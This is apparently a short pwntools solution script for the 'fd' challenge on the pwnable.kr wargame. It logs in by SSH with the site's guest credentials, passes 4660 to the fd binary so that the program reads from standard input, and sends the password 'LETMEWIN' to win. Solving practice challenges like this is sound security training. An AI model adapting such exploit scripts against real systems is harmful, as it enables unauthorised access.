from pwn import *

shell = ssh(user='fd', host='pwnable.kr', port=2222, password='guest')
io = shell.process(executable='./fd', argv=['fd', '4660'])
io.sendline(b'LETMEWIN')
io.interactive()